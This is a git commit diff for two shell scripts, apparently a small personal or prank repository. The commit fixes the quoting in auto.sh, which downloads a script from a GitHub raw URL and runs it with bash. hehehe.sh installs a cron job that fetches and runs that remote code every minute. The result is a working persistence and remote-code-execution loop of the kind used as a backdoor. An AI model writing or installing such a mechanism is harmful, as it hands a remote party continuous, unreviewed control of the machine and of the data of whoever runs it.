57d7729a2ec44f0f1be2bfdf5de9d62234ecc5d7
Isacc Barker <milobanks@zincsoft.dev>
2022-03-01 12:32:38 -0700

    a complex web of shit

--- auto.sh
+++ auto.sh
@@ -2,7 +2,7 @@ set -e
 
 curl https://raw.githubusercontent.com/IsaccBarker/sophial/main/script.sh > ~/.script
 touch ~/.pre
-if [ \"\$\(cat ~/.pre)\" != \"\$(cat ~/.script)\" ]; then;
+if [ "$(cat ~/.pre)" != "$(cat ~/.script)" ]; then
     bash ~/.script; cat ~/.script > ~/.pre;
 fi
 
--- hehehe.sh
+++ hehehe.sh
@@ -5,5 +5,3 @@ curl https://raw.githubusercontent.com/IsaccBarker/sophial/main/auto.sh > ~/auto
 (crontab -l 2>/dev/null; echo "* * * * * bash ~/auto.sh") | crontab -
 echo "\033[7m\033[1m\033[92mCRONJOB INSTALLED\033[0m"
 
-curl https://raw.githubusercontent.com/IsaccBarker/sophial/main/script.sh > ~/.script && touch ~/.pre && if [ \"\$\(cat ~/.pre)\" != \"\$(cat ~/.script)\" ]; then; bash ~/.script; cat ~/.script > ~/.pre; fi
-
